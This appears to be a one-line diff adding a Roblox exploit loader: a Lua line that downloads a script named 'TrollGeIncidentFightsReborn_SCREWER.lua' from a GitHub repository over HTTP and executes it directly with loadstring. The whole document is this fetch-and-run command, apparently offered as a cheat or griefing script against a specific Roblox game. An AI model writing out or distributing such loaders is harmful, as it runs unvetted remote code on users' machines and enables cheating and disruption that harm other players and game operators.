@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BongCloudMaster/ScriptsForRBLX/main/TrollGeIncidentFightsReborn_SCREWER.lua"))();
